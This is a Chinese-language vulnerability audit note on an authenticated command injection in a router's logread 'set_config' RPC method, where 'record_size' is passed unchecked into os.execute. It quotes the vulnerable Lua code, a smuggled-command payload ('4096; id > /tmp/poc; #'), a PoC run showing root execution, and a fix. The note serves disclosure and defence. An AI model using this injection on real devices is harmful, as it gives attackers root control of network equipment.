# 额外漏洞：logread.set_config record_size 命令注入

> 发现于 logread_get_system_log_rpc_rce 的二次审计。同文件中的 `set_config` 方法存在独立的命令注入点。

## 漏洞概要

| 属性 | 值 |
|------|-----|
| **状态** | Confirmed + PoC 打通 |
| **认证** | 需要 admin session |
| **注入参数** | `record_size` |
| **Sink** | `os.execute("insmod /lib/modules/4.14.221/mtdoops.ko record_size=" .. record_size .. " mtddev=log")` |
| **PoC** | `exp/poc_logread_set_config_rce.py` (33行) |

## 源码验证

```lua
-- /usr/lib/oui-httpd/rpc/logread 第227行
function M.set_config(params)
    local record_size = params.record_size
    if record_size then
        c:set("gl_logread", "crash", "record_size", record_size)
        c:commit("gl_logread")
        os.execute("rmmod mtdoops")
        os.execute("insmod /lib/modules/4.14.221/mtdoops.ko record_size="
                   .. record_size .. " mtddev=log")   -- 💣 SINK
    end
end
```

## 注入原理

```
record_size = "4096; id > /tmp/poc; #"
→ cmd = "insmod .../mtdoops.ko record_size=4096; id > /tmp/poc; # mtddev=log"
→ /bin/sh -c <cmd>:
    insmod ... record_size=4096  ← insmod 失败（参数不完整）
    ; id > /tmp/poc              ← 💣 RCE
    ; # mtddev=log               ← 尾部被注释
```

## 与 get_system_log 的对比

| 特性 | get_system_log | set_config |
|------|---------------|------------|
| 注入参数 | `module` | `record_size` |
| Sink | `io.popen()` | `os.execute()` |
| 输出返回 | `f:read("*a")` → result.log | 不返回（需重定向到文件） |
| 类型校验 | 无 | 文档标注 number 但无强制 |

## PoC 测试结果

```
$ python3 poc_logread_set_config_rce.py https://192.168.8.1 "id > /tmp/poc_logread_set"
[+] sid=UQIIvZaWNvIoPBq6QmV6hUeG6zCLdO75
[+] result: {"id": 3, "jsonrpc": "2.0", "result": []}

# Download verification:
$ curl ... /download path=/tmp/poc_logread_set
uid=0(root) gid=0(root) groups=0(root),65533(rpc)
```

## 修复建议

`record_size` 应使用 `tonumber()` 强制类型转换，或校验为正整数字符串 `^[0-9]+$`。
